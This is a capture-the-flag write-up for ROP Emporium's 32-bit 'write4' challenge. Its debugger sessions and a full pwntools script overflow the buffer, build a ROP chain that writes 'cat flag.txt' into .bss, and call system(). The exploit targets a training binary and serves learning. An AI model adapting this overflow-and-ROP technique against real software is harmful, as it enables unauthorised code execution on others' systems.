The goal of the challenge is to master the writing in memory with ropchain. 
In this case we want to write the string '*cat flag.txt*' somewhere in memory. Then perform a system with this string as argument.
To do that we some ingredients:
- writeable memory area
- gadgets to write in memory
- gadgets to execute system()

As always running checksec we have:
```shell
[marco@marco-pc Downloads]$ checksec --file="write432"
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   81 Symbols     No	0		3	write432
```

Before build our ropchain let's see now many bytes there are until eip:
```gdb
[marco@marco-pc Downloads]$ gdb-pwndbg write432
Reading symbols from write432...
(No debugging symbols found in write432)
pwndbg: loaded 181 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
pwndbg> cyclic 50
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
pwndbg> r
Starting program: /home/marco/Downloads/write432 
write4 by ROP Emporium
32bits

Go ahead and give me the string already!
> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama

Program received signal SIGSEGV, Segmentation fault.
0x6161616c in ?? ()
...
 EIP  0x6161616c ('laaa')
...
Program received signal SIGSEGV (fault address 0x6161616c)
pwndbg> cyclic -l 'laaa'
44
```

With readelf we can explore memory sections marked as readable and their dimensions:
```shell
[marco@marco-pc Downloads]$ readelf -S write432
There are 31 section headers, starting at offset 0x196c:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4
  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4
  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 000030 04   A  5   0  4
  [ 5] .dynsym           DYNSYM          080481dc 0001dc 0000d0 10   A  6   1  4
  [ 6] .dynstr           STRTAB          080482ac 0002ac 000081 00   A  0   0  1
  [ 7] .gnu.version      VERSYM          0804832e 00032e 00001a 02   A  5   0  2
  [ 8] .gnu.version_r    VERNEED         08048348 000348 000020 00   A  6   1  4
  [ 9] .rel.dyn          REL             08048368 000368 000020 08   A  5   0  4
  [10] .rel.plt          REL             08048388 000388 000038 08  AI  5  24  4
  [11] .init             PROGBITS        080483c0 0003c0 000023 00  AX  0   0  4
  [12] .plt              PROGBITS        080483f0 0003f0 000080 04  AX  0   0 16
  [13] .plt.got          PROGBITS        08048470 000470 000008 00  AX  0   0  8
  [14] .text             PROGBITS        08048480 000480 000262 00  AX  0   0 16
  [15] .fini             PROGBITS        080486e4 0006e4 000014 00  AX  0   0  4
  [16] .rodata           PROGBITS        080486f8 0006f8 000064 00   A  0   0  4
  [17] .eh_frame_hdr     PROGBITS        0804875c 00075c 00003c 00   A  0   0  4
  [18] .eh_frame         PROGBITS        08048798 000798 00010c 00   A  0   0  4
  [19] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4
  [20] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4
  [21] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4
  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4
  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4
  [24] .got.plt          PROGBITS        0804a000 001000 000028 04  WA  0   0  4
  [25] .data             PROGBITS        0804a028 001028 000008 00  WA  0   0  4
  [26] .bss              NOBITS          0804a040 001030 00002c 00  WA  0   0 32
  [27] .comment          PROGBITS        00000000 001030 000034 01  MS  0   0  1
  [28] .shstrtab         STRTAB          00000000 001861 00010a 00      0   0  1
  [29] .symtab           SYMTAB          00000000 001064 000510 10     30  50  4
  [30] .strtab           STRTAB          00000000 001574 0002ed 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  p (processor specific)
```

The bss section seems to be perfect!
Now we need some gadgets to write in memory.
Something like mov `DWORD PTR [reg], reg; ret`.
In this case the program give us usefulGadget:
```gdb
[marco@marco-pc Downloads]$ gdb-pwndbg write432
Reading symbols from write432...
(No debugging symbols found in write432)
pwndbg: loaded 181 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
pwndbg> disassemble usefulGadgets
Dump of assembler code for function usefulGadgets:
   0x08048670 <+0>:     mov    DWORD PTR [edi],ebp
   0x08048672 <+2>:     ret    
   0x08048673 <+3>:     xchg   ax,ax
   0x08048675 <+5>:     xchg   ax,ax
   0x08048677 <+7>:     xchg   ax,ax
   0x08048679 <+9>:     xchg   ax,ax
   0x0804867b <+11>:    xchg   ax,ax
   0x0804867d <+13>:    xchg   ax,ax
   0x0804867f <+15>:    nop
End of assembler dump.
```

Usually we need to find ourself.
Another gadget we need is a pop instruction for load values into registers (in this case: bss address in edi, string ebp):
```shell
[marco@marco-pc Downloads]$ cat gadgets | grep pop
0x080486ef : adc ebx, dword ptr [ecx] ; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
0x080483dc : add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
0x080485ed : add byte ptr [ebx - 0x723603b3], cl ; popal ; cld ; ret
0x080486d5 : add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080483de : add esp, 8 ; pop ebx ; ret
0x080486d4 : jecxz 0x8048661 ; les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0x080486d3 : jne 0x80486c1 ; add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080483df : les ecx, ptr [eax] ; pop ebx ; ret
0x080486d6 : les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0x080486d7 : or al, 0x5b ; pop esi ; pop edi ; pop ebp ; ret
0x080486db : pop ebp ; ret
0x080486d8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080483e1 : pop ebx ; ret
0x080486da : pop edi ; pop ebp ; ret
0x080486d9 : pop esi ; pop edi ; pop ebp ; ret
0x080485f3 : popal ; cld ; ret
```
'*pop edi; pop ebp*' fit perfectly for our purpose.
To execute the write i wrote a dedicated function, which basically pad the string with null bytes until the length is a multiple of 4.
Then cut the string in group by 4. And finally it writes 4 bytes at a time in memory adding 4 to the address for each write:
```python
def write_string_bss(mov_gadget, pop_gadget, bss_address, string):
    while len(string) % 4 != 0:
        string += "\x00"

    splitted_string = [string[i:i + 4] for i in range(0, len(string), 4)]
    payload = "".encode()
    for i in range(len(splitted_string)):
        payload += p32(pop_gadget)
        payload += p32(bss_address + (i * 4))
        payload += splitted_string[i].encode()
        payload += p32(mov_gadget)
    return payload
```

It's almost done. We just need a system to execute the syscall like in split challenge:
```
[marco@marco-pc Downloads]$ gdb-pwndbg write432 
Reading symbols from write432...
(No debugging symbols found in write432)
pwndbg: loaded 181 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
pwndbg> p system
$1 = {<text variable, no debug info>} 0x8048430 <system@plt>
```

Final exploit:
```python
from pwn import *

string = "cat flag.txt"
system = 0x8048430
usefulGadgets =  0x08048670 # mov DWORD PTR [edi], ebp
pop_gadget = 0x080486da; #pop edi ; pop ebp ; ret
bss_address = 0x0804a040

def write_string_bss(mov_gadget, pop_gadget, bss_address, string):
    while len(string) % 4 != 0:
        string += "\x00"

    splitted_string = [string[i:i + 4] for i in range(0, len(string), 4)]
    payload = "".encode()
    for i in range(len(splitted_string)):
        payload += p32(pop_gadget)
        payload += p32(bss_address + (i * 4))
        payload += splitted_string[i].encode()
        payload += p32(mov_gadget)
    return payload


exploit = ("A"*44).encode()
exploit += write_string_bss(usefulGadgets, pop_gadget, bss_address, string)
exploit += p32(system)
exploit += ("JUNK").encode()
exploit += p32(bss_address)

p = process('./write432')
p.recvuntil('>')
p.sendline(exploit)
p.interactive()
print(p.recvall().decode())
```
